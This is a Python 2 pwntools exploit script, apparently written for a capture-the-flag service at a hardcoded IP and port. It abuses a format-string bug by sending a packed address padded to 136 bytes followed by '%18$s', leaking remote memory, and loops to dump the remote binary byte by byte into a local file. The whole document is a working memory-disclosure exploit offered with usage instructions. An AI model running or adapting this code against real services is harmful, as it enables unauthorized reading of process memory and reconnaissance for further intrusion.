#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')

host = '35.237.220.217'
port = 1339

def start():
    return connect(host, port)


# Dumps bytes starting at address 
def rawdump(address):
    with context.local(log_level='CRITICAL'): #this just removes some logging
        io = start()

    payload = pack(address)                 # Pack the pointer to the address
    payload = payload.ljust(136, "A")   # Pad until second buffer

    payload+= "%18$s"               # This is printf'd. Parameter 18 is the packed address above

    io.sendline(payload)
    io.recvline()
    io.recvline()
    io.recvline() # 8
    io.recvline() # A quick brown fox...
    res = io.recvline()[:-1] # Read response and remove final \n
    try:
        io.recvline()
        with context.local(log_level='CRITICAL'):
            io.close()
        return res
    except:
        with context.local(log_level='CRITICAL'):
            io.close()
        return None
    return res


if len(sys.argv)<3:
    print("%s <0xaddress> <outputfile>" % (sys.argv[0]))
    sys.exit()

address = int(sys.argv[1],0)
f=open(sys.argv[2],"ab")

p = log.progress("Dumping...")
while True:
    p.status("Dumping address %x", address)
    log.info
    raw = rawdump(address)
    if raw == None:
        log.info("Empty response at address %x", address)
        f.write(b"\x7f") # It works for the first byte \x7fELF
        address+=1
    else:
        f.write(raw)
        f.write(b"\x00") #The null byte at the end of the string
        address+=len(raw)+1
    
    f.flush()

f.close()
sys.exit()

